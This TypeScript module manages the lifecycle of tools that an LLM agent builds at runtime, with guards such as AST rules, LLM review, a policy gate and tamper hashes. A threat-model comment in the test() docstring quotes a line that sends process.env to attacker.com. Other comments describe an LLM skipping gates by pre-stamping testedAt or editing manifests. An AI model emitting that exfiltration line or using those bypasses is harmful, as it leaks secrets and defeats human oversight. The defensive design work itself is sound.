/**
 * ConstructionRuntime — stage / test / activate / revoke / list lifecycle
 * for runtime-generated capabilities (FEATURE_087, v0.7.28).
 *
 * Module-level singleton: KodaX runs one runtime per process. Tests
 * reset via `_resetRuntimeForTesting()`. Configuration is overridden
 * through `configureRuntime({ cwd, policy })`.
 *
 * No class boilerplate (KodaX philosophy — small focused functions). The
 * "instance state" is just two module-private variables: `_options` and
 * `_activated`. Persistence is the file system itself; no in-memory
 * artifact cache outside what TOOL_REGISTRY already holds via the
 * unregister-callback map.
 *
 * v0.7.28 Phase 1 scope:
 *   - Lifecycle plumbing only.
 *   - `test()` is intentionally minimal — Guardrail static check + LLM
 *     review + provider schema validator land in Phase 2.
 *   - Policy gate honors a `'reject'` verdict but throws on `'ask-user'`
 *     because Phase 1 has no built-in user-prompt UI; callers (REPL,
 *     test code) must override `constructionPolicy` to wire one.
 */

import path from 'path';
import fs from 'fs/promises';
import crypto from 'crypto';

import type { LocalToolDefinition } from '../tools/types.js';
import { registerTool } from '../tools/registry.js';
import type { KodaXToolDefinition } from '@kodax/ai';

import { loadHandler } from './load-handler.js';
import { runAstRules } from './ast-rules.js';
import { validateToolSchemaForProvider, type SchemaProvider } from './provider-schema.js';
import { runLlmReview, type LlmReviewClient, type LlmReviewResult } from './llm-review.js';
import {
  type ConstructionArtifact,
  type ConstructionPolicy,
  type StagedHandle,
  type TestResult,
  defaultPolicy,
  ConstructionManifestError,
} from './types.js';

const CONSTRUCTED_ROOT_SUBPATH = path.join('.kodax', 'constructed');

/**
 * Reject artifact identifiers that could escape `.kodax/constructed/<kind>s/`
 * via path traversal. Catches both the obvious cases (`../../etc/passwd`,
 * absolute paths, drive letters) and Windows-reserved characters that
 * would break manifest persistence.
 *
 * Restricts to `[A-Za-z0-9._-]` plus a leading semver-friendly char.
 * Length cap (128) bounds the on-disk path length so a 4 KB filename
 * can't be smuggled in. Not a security boundary on its own — defense in
 * depth alongside the policy gate.
 */
function assertSafeIdentifier(value: unknown, label: string): asserts value is string {
  if (typeof value !== 'string' || value.length === 0 || value.length > 128) {
    throw new ConstructionManifestError(
      `Invalid ${label}: must be a non-empty string ≤ 128 chars (got ${typeof value === 'string' ? `length=${value.length}` : typeof value}).`,
    );
  }
  if (!/^[A-Za-z0-9][A-Za-z0-9._-]*$/.test(value) || value.includes('..')) {
    throw new ConstructionManifestError(
      `Invalid ${label} ${JSON.stringify(value)}: must match [A-Za-z0-9][A-Za-z0-9._-]* with no '..' sequences. Reserved separator/control characters and parent-traversal segments are rejected.`,
    );
  }
}

/** SHA-256 of the artifact's `content` field, hex-encoded. */
function computeContentHash(content: ConstructionArtifact['content']): string {
  return crypto.createHash('sha256').update(JSON.stringify(content)).digest('hex');
}

/**
 * Single source of truth for which artifact kinds the runtime understands.
 * v0.7.28 ships only `'tool'`; FEATURE_089 adds `'agent'`, FEATURE_090
 * adds `'skill'`, etc. Adding a new kind to this constant is the only
 * change required in this file — both `loadAllArtifacts()` and
 * `readArtifactByVersion()` iterate over it.
 */
const SUPPORTED_KINDS: ReadonlyArray<ConstructionArtifact['kind']> = ['tool'];

interface RuntimeOptions {
  /** Workspace root for `.kodax/constructed/`. Defaults to `process.cwd()`. */
  readonly cwd: string;
  /** Activation policy gate. Defaults to `defaultPolicy` (ask-user). */
  readonly policy: ConstructionPolicy;
}

let _options: RuntimeOptions = {
  cwd: process.cwd(),
  policy: defaultPolicy,
};

/**
 * Map of `name@version` → unregister callback returned by registerTool().
 * Populated on activate(); consumed by revoke().
 */
const _activated = new Map<string, () => void>();

export function configureRuntime(overrides: Partial<RuntimeOptions>): void {
  _options = {
    cwd: overrides.cwd ?? _options.cwd,
    policy: overrides.policy ?? _options.policy,
  };
}

/** Test-only — clears in-memory state. Does not touch the filesystem. */
export function _resetRuntimeForTesting(): void {
  for (const unregister of _activated.values()) {
    unregister();
  }
  _activated.clear();
  _options = { cwd: process.cwd(), policy: defaultPolicy };
}

// ============================================================
// Public lifecycle
// ============================================================

/**
 * Persist a freshly-built artifact to `.kodax/constructed/<kind>s/<name>/<version>.json`
 * with `status: 'staged'`.
 *
 * Version immutability: if any manifest at the same name+version already
 * exists on disk (in any status — staged, active, or revoked), stage()
 * refuses to overwrite. Bumping the semver is the supported update path.
 *
 * Why "any status", not just `'active'`:
 *   The handler's `.js` module is loaded via `await import(file://…)`
 *   which the ESM module cache keys by absolute file URL. Re-writing
 *   `<version>.js` in place leaves the cached module pointing at the
 *   OLD code; subsequent loadHandler() calls return the cached export.
 *   Even revoking first does not flush the cache (Node has no public
 *   ESM cache eviction API). The only safe-by-construction policy is
 *   "version is immutable on disk — bump semver to update."
 *
 * Lifecycle timestamp reset: `testedAt` / `activatedAt` / `revokedAt`
 * are explicitly cleared on the persisted record, even if the input
 * artifact carries them. Defends against an LLM-supplied artifact
 * pre-stamping testedAt to bypass the activate() gate.
 */
export async function stage(artifact: ConstructionArtifact): Promise<StagedHandle> {
  assertSafeIdentifier(artifact.name, 'artifact.name');
  assertSafeIdentifier(artifact.version, 'artifact.version');

  const target = manifestPath(artifact);
  try {
    const raw = await fs.readFile(target, 'utf8');
    const existing = JSON.parse(raw) as ConstructionArtifact;
    throw new ConstructionManifestError(
      `Cannot stage '${artifact.name}@${artifact.version}': a manifest already exists at this version (status='${existing.status}'). `
      + `Constructed artifacts are version-immutable — bump the semver to publish a new variant. `
      + `Re-staging the same version would silently shadow the cached ESM module, even after revoke.`,
      target,
    );
  } catch (err) {
    if (err instanceof ConstructionManifestError) throw err;
    if ((err as NodeJS.ErrnoException).code !== 'ENOENT') throw err;
    // ENOENT — first time staging this name+version, proceed.
  }

  const filled: ConstructionArtifact = {
    ...artifact,
    status: 'staged',
    createdAt: artifact.createdAt || Date.now(),
    testedAt: undefined,
    activatedAt: undefined,
    revokedAt: undefined,
    contentHash: undefined,
  };

  await persistArtifact(filled);
  return { artifact: filled, stagedAt: Date.now() };
}

/**
 * Validate a staged artifact. Runs the static-only check pipeline:
 *
 *   1. Shape sanity (kind, handler.language, capabilities.tools array).
 *   2. AST hard rules (no-eval / no-Function-constructor / require-handler-signature).
 *   3. provider schema validation (Anthropic by default — main path).
 *   4. LLM static review (only when caller injects `options.llmReviewer`).
 *
 * Verdict dispatch on LLM review:
 *   - 'safe'        → ok=true, no LLM-review warnings.
 *   - 'suspicious'  → ok=true, concerns surfaced as warnings; downstream
 *                     `activate()` will run the policy gate (default
 *                     ask-user) which can show those concerns to the user.
 *   - 'dangerous'   → ok=false, errors carry the LLM concerns; activate
 *                     will not be reachable without a fresh stage().
 *
 * IMPORTANT — handler is NOT materialized here. The earlier "materialize
 * handler to surface syntax errors" step performed `await import(file://…)`
 * BEFORE the policy gate, which executed the handler module's top-level
 * code as a side effect. AST rules cover `eval` / `Function`, but a
 * top-level `await fetch('http://attacker.com', { body: process.env })`
 * was unguarded — see DD §14.5 threat model. loadHandler() now happens
 * exclusively inside `activate()` after the policy verdict is `'approve'`,
 * making the policy gate the single chokepoint for code execution.
 *
 * The LLM reviewer is opt-in: tests and Phase 1 callers that don't pass
 * a client get the deterministic AST + schema path only.
 */
export interface TestArtifactOptions {
  /** Provider whose tool schema constraints are checked. Defaults to 'anthropic'. */
  readonly provider?: SchemaProvider;
  /** Inject a real or mock LLM client to run static review. Optional. */
  readonly llmReviewer?: LlmReviewClient;
}

export async function test(
  handle: StagedHandle,
  options: TestArtifactOptions = {},
): Promise<TestResult> {
  const { artifact } = handle;
  const errors: string[] = [];
  const warnings: string[] = [];

  // 1. Shape sanity
  if (artifact.kind !== 'tool') {
    errors.push(`Unsupported artifact kind '${artifact.kind}'. v0.7.28 only generates tools.`);
  }
  if (artifact.content.handler.language !== 'javascript') {
    errors.push(`Handler language must be 'javascript' (got '${artifact.content.handler.language}').`);
  }
  if (!Array.isArray(artifact.content.capabilities.tools)) {
    errors.push('capabilities.tools must be an array of strings.');
  } else {
    for (const t of artifact.content.capabilities.tools) {
      if (typeof t !== 'string' || t.trim().length === 0) {
        errors.push(`capabilities.tools entry must be a non-empty string (got: ${JSON.stringify(t)}).`);
        break;
      }
    }
  }

  if (errors.length > 0) {
    return { ok: false, errors };
  }

  // 2. AST hard rules
  const ast = runAstRules(artifact.content.handler.code);
  if (!ast.ok) {
    for (const v of ast.violations) {
      errors.push(`[${v.rule}] ${v.message}`);
    }
    return { ok: false, errors };
  }

  // 3. Provider schema validation
  const schemaResult = validateToolSchemaForProvider(
    artifact.content.inputSchema,
    options.provider ?? 'anthropic',
  );
  for (const w of schemaResult.warnings) warnings.push(w);
  if (!schemaResult.ok) {
    for (const e of schemaResult.errors) errors.push(`[schema] ${e}`);
    return { ok: false, errors, warnings };
  }

  // 4. LLM static review (opt-in)
  if (options.llmReviewer) {
    let review: LlmReviewResult;
    try {
      review = await runLlmReview(
        {
          handlerCode: artifact.content.handler.code,
          capabilities: artifact.content.capabilities,
          artifactRef: `${artifact.name}@${artifact.version}`,
        },
        options.llmReviewer,
      );
    } catch (err) {
      // Defense in depth: a reviewer that fails to produce a verdict is
      // not authoritative. Treat as 'dangerous' — caller may retry.
      errors.push(`LLM review failed to produce a verdict: ${(err as Error).message}`);
      return { ok: false, errors, warnings };
    }

    if (review.verdict === 'dangerous') {
      errors.push(`LLM review verdict='dangerous'.`);
      for (const c of review.concerns) errors.push(`[review] ${c}`);
      return { ok: false, errors, warnings };
    }
    if (review.verdict === 'suspicious') {
      warnings.push(`LLM review verdict='suspicious' — policy gate will see these concerns:`);
      for (const c of review.concerns) warnings.push(`[review] ${c}`);
    }
    // 'safe' → no further action.
  }

  // Persist a NEW artifact with testedAt set (immutable update — never
  // mutate the input). The persisted record drives the activate() gate.
  const tested: ConstructionArtifact = { ...artifact, testedAt: Date.now() };
  await persistArtifact(tested);
  return warnings.length > 0 ? { ok: true, warnings } : { ok: true };
}

/**
 * Activate a staged-and-tested artifact: invoke policy gate, materialize
 * the handler, register into TOOL_REGISTRY, persist `status='active'`.
 *
 * Throws `'reject'` policy verdicts as errors. `'ask-user'` requires the
 * caller to have overridden the policy (Phase 1 has no built-in prompt UI).
 *
 * Pre-conditions:
 *   - artifact.testedAt must be set (test() must have run successfully).
 *     Without this gate the AST/schema/LLM-review chain could be skipped
 *     entirely by an LLM that calls activate_tool directly after stage_tool.
 *   - artifact.status must not be 'revoked' (terminal).
 *
 * Side-effects:
 *   - loadHandler() runs `await import(file://…)` AFTER policy approval.
 *     The handler module's top-level code only executes once policy says
 *     'approve'. This makes the policy gate the single chokepoint for
 *     code execution; the handler does not run during test().
 *   - Records `contentHash = sha256(JSON.stringify(content))` so
 *     rehydrate at the next boot can detect cross-session manifest
 *     tampering (see ConstructionArtifact.contentHash for threat model).
 */
export async function activate(handle: StagedHandle): Promise<void> {
  const initial = handle.artifact;

  assertSafeIdentifier(initial.name, 'artifact.name');
  assertSafeIdentifier(initial.version, 'artifact.version');

  // Filesystem is the source of truth (DD §14.1). Re-read the persisted
  // record so this function works whether the caller threaded the latest
  // testedAt / status onto the in-memory handle or not — keeps the
  // `stage → test → activate` chain composable and matches the
  // `toolActivateTool` builtin path which also re-reads from disk.
  const artifact = await readArtifactByVersion(initial.name, initial.version);
  if (!artifact) {
    throw new Error(
      `Cannot activate '${initial.name}@${initial.version}': artifact not found on disk. Stage and test it first.`,
    );
  }

  // Lifecycle guard: revoked artifacts are terminal — re-activation must
  // go through a fresh stage(name, newVersion). Re-activating an already-
  // active artifact short-circuits to the idempotent re-register path
  // below (preserves the same `_activated` map entry).
  if (artifact.status === 'revoked') {
    throw new Error(
      `Cannot activate '${artifact.name}@${artifact.version}': artifact is revoked. `
      + `Revoked artifacts are terminal; bump the version and re-stage.`,
    );
  }
  if (!artifact.testedAt) {
    throw new Error(
      `Cannot activate '${artifact.name}@${artifact.version}': artifact has not passed test(). `
      + `Call test_tool first — activation must follow the AST/schema/LLM-review chain so the policy gate is not the only line of defense.`,
    );
  }

  const verdict = await _options.policy(artifact);
  if (verdict === 'reject') {
    throw new Error(
      `Construction policy rejected '${artifact.name}@${artifact.version}'.`,
    );
  }
  if (verdict === 'ask-user') {
    // The REPL surface binds a dialog-based policy in
    // packages/repl/src/common/construction-bootstrap.ts so 'ask-user'
    // never reaches here on the interactive path. Hitting this branch
    // means activation was attempted from a non-interactive surface
    // whose policy was left at the default (returns 'ask-user' but no
    // UI to ask through) — treat as a configuration error.
    throw new Error(
      `Construction policy returned 'ask-user' for '${artifact.name}@${artifact.version}', `
      + `but the current surface has no interactive UI bound. Activation must originate from a session whose policy can prompt the user (e.g. the Ink REPL).`,
    );
  }

  await registerActiveArtifact(artifact);

  // Immutable update — persist a NEW artifact record rather than mutating
  // the caller's reference. Records contentHash for rehydrate integrity.
  const activated: ConstructionArtifact = {
    ...artifact,
    status: 'active',
    activatedAt: Date.now(),
    contentHash: computeContentHash(artifact.content),
  };
  await persistArtifact(activated);
}

/**
 * Internal: load handler + register into TOOL_REGISTRY without going
 * through the policy gate. Used by `activate()` (after policy approval)
 * and by `rehydrateActiveArtifacts()` (where the artifact was already
 * approved in a previous session — re-prompting on each startup is wrong
 * UX).
 *
 * Idempotent on the same name@version: existing registration is
 * unregistered before the new one is pushed, preventing double entries.
 */
async function registerActiveArtifact(artifact: ConstructionArtifact): Promise<void> {
  const handler = await loadHandler(
    { name: artifact.name, version: artifact.version, cwd: _options.cwd },
    artifact.content.handler,
    artifact.content.capabilities,
    { timeoutMs: artifact.content.timeoutMs },
  );

  const definition: LocalToolDefinition = {
    name: artifact.name,
    description: artifact.content.description,
    input_schema: artifact.content.inputSchema as KodaXToolDefinition['input_schema'],
    handler,
  };

  const existing = _activated.get(activeKey(artifact));
  if (existing) {
    existing();
  }

  const unregister = registerTool(definition, {
    source: {
      kind: 'constructed',
      id: `constructed:${artifact.name}@${artifact.version}`,
      label: artifact.name,
      version: artifact.version,
      manifestPath: manifestPath(artifact),
    },
  });

  _activated.set(activeKey(artifact), unregister);
}

/**
 * Rehydrate every artifact whose `status === 'active'` back into
 * TOOL_REGISTRY. Called once at process startup (REPL boot). Does NOT
 * re-run policy gate — startup is restoring previously-approved state,
 * not asking for fresh approval.
 *
 * Integrity check: each artifact's `contentHash` (recorded at activate
 * time) is recomputed and compared to the persisted value. Mismatches
 * are tampered = skipped with a stderr warning. This catches naive
 * cross-session edits to the manifest JSON (e.g. an LLM rewriting the
 * file via the Write tool without recomputing the hash). Sophisticated
 * attackers who recompute the hash can bypass this — defense scoped to
 * single-user CLI integrity, not multi-tenant supply chain.
 *
 * Legacy artifacts written before contentHash existed are accepted as-is
 * (no hash to compare against) and the missing hash is back-filled on a
 * future activate() — keeps upgrades from breaking previously-approved
 * tools.
 *
 * Returns counts so callers can surface a loaded/failed/tampered banner.
 * Failures are logged (console.warn) and rehydration continues for the
 * remaining artifacts; a single bad manifest must not break boot.
 */
export async function rehydrateActiveArtifacts(): Promise<{
  loaded: number;
  failed: number;
  tampered: number;
}> {
  const all = await loadAllArtifacts(_options.cwd);
  const active = all.filter((a) => a.status === 'active');

  let loaded = 0;
  let failed = 0;
  let tampered = 0;

  for (const artifact of active) {
    if (artifact.contentHash) {
      const recomputed = computeContentHash(artifact.content);
      if (recomputed !== artifact.contentHash) {
        tampered += 1;
        console.warn(
          `[ConstructionRuntime] Refusing to rehydrate ${artifact.name}@${artifact.version}: contentHash mismatch (manifest was edited after activation). Re-stage and re-activate to re-approve.`,
        );
        continue;
      }
    }
    try {
      await registerActiveArtifact(artifact);
      loaded += 1;
    } catch (err) {
      failed += 1;
      console.warn(
        `[ConstructionRuntime] Failed to rehydrate ${artifact.name}@${artifact.version}: ${(err as Error).message}`,
      );
    }
  }

  return { loaded, failed, tampered };
}

/**
 * Revoke an active constructed tool. Removes the registration from
 * TOOL_REGISTRY (the stack falls back to any prior version or builtin)
 * and flips `status` to `'revoked'` on disk. The .js source remains for
 * audit; the artifact JSON remains for history.
 *
 * Idempotent: revoking an unknown name@version is a no-op.
 */
export async function revoke(name: string, version: string): Promise<void> {
  assertSafeIdentifier(name, 'name');
  assertSafeIdentifier(version, 'version');

  const key = `${name}@${version}`;
  const unregister = _activated.get(key);
  if (unregister) {
    unregister();
    _activated.delete(key);
  }

  const artifact = await readArtifactByVersion(name, version);
  if (artifact) {
    // Immutable update — persist a NEW artifact record.
    const revoked: ConstructionArtifact = {
      ...artifact,
      status: 'revoked',
      revokedAt: Date.now(),
    };
    await persistArtifact(revoked);
  }
}

/**
 * List all artifacts on disk, optionally filtered by kind.
 * Returns artifacts of any status (staged / active / revoked); callers
 * that only want active should pipe through `.filter(a => a.status === 'active')`.
 */
export async function list(
  kind?: ConstructionArtifact['kind'],
): Promise<ConstructionArtifact[]> {
  return loadAllArtifacts(_options.cwd, kind);
}

// ============================================================
// Internal helpers
// ============================================================

function manifestPath(artifact: ConstructionArtifact): string {
  return path.resolve(
    _options.cwd,
    CONSTRUCTED_ROOT_SUBPATH,
    `${artifact.kind}s`,
    artifact.name,
    `${artifact.version}.json`,
  );
}

function activeKey(artifact: ConstructionArtifact): string {
  return `${artifact.name}@${artifact.version}`;
}

async function persistArtifact(artifact: ConstructionArtifact): Promise<void> {
  const filePath = manifestPath(artifact);
  await fs.mkdir(path.dirname(filePath), { recursive: true });
  await fs.writeFile(filePath, JSON.stringify(artifact, null, 2), 'utf8');
}

/**
 * Public lookup: read a persisted artifact by name+version. Iterates every
 * supported kind. Returns `undefined` if not found.
 *
 * Used by the `test_tool` / `activate_tool` builtins to round-trip from a
 * caller-supplied identifier back to the on-disk manifest, since the
 * runtime keeps no in-memory artifact cache.
 */
export async function readArtifact(
  name: string,
  version: string,
): Promise<ConstructionArtifact | undefined> {
  assertSafeIdentifier(name, 'name');
  assertSafeIdentifier(version, 'version');
  return readArtifactByVersion(name, version);
}

async function readArtifactByVersion(
  name: string,
  version: string,
): Promise<ConstructionArtifact | undefined> {
  // We don't know the kind a priori; iterate every supported kind.
  for (const kind of SUPPORTED_KINDS) {
    const filePath = path.resolve(
      _options.cwd,
      CONSTRUCTED_ROOT_SUBPATH,
      `${kind}s`,
      name,
      `${version}.json`,
    );
    try {
      const raw = await fs.readFile(filePath, 'utf8');
      return JSON.parse(raw) as ConstructionArtifact;
    } catch (err) {
      if ((err as NodeJS.ErrnoException).code === 'ENOENT') continue;
      throw err;
    }
  }
  return undefined;
}

/**
 * Walk `.kodax/constructed/<kind>s/*` and return all parseable artifacts.
 * Skips files that fail to parse (with a console warning) rather than
 * crashing startup — invariant: a malformed manifest must not break
 * KodaX boot. Tests verify this.
 */
async function loadAllArtifacts(
  cwd: string,
  kindFilter?: ConstructionArtifact['kind'],
): Promise<ConstructionArtifact[]> {
  const root = path.resolve(cwd, CONSTRUCTED_ROOT_SUBPATH);
  const out: ConstructionArtifact[] = [];

  const kinds: ReadonlyArray<ConstructionArtifact['kind']> = kindFilter
    ? [kindFilter]
    : SUPPORTED_KINDS;

  for (const kind of kinds) {
    const kindDir = path.join(root, `${kind}s`);
    let nameDirs: string[];
    try {
      nameDirs = await fs.readdir(kindDir);
    } catch (err) {
      if ((err as NodeJS.ErrnoException).code === 'ENOENT') continue;
      throw err;
    }

    for (const nameDir of nameDirs) {
      const namePath = path.join(kindDir, nameDir);
      let versionFiles: string[];
      try {
        versionFiles = await fs.readdir(namePath);
      } catch {
        continue;
      }
      for (const versionFile of versionFiles) {
        if (!versionFile.endsWith('.json')) continue;
        const filePath = path.join(namePath, versionFile);
        try {
          const raw = await fs.readFile(filePath, 'utf8');
          const parsed = JSON.parse(raw) as ConstructionArtifact;
          // Light shape check; bad manifests are skipped not thrown.
          if (
            typeof parsed.name === 'string'
            && typeof parsed.version === 'string'
            && typeof parsed.kind === 'string'
            && typeof parsed.status === 'string'
          ) {
            out.push(parsed);
          } else {
            console.warn(
              `[ConstructionRuntime] Skipping malformed manifest at ${filePath} — missing required fields.`,
            );
          }
        } catch (err) {
          console.warn(
            `[ConstructionRuntime] Skipping unreadable manifest at ${filePath}: ${(err as Error).message}`,
          );
        }
      }
    }
  }

  return out;
}

// Re-export for downstream modules
export { loadAllArtifacts as _loadAllArtifactsForStartup };

// Surface ConstructionManifestError for callers
export { ConstructionManifestError };
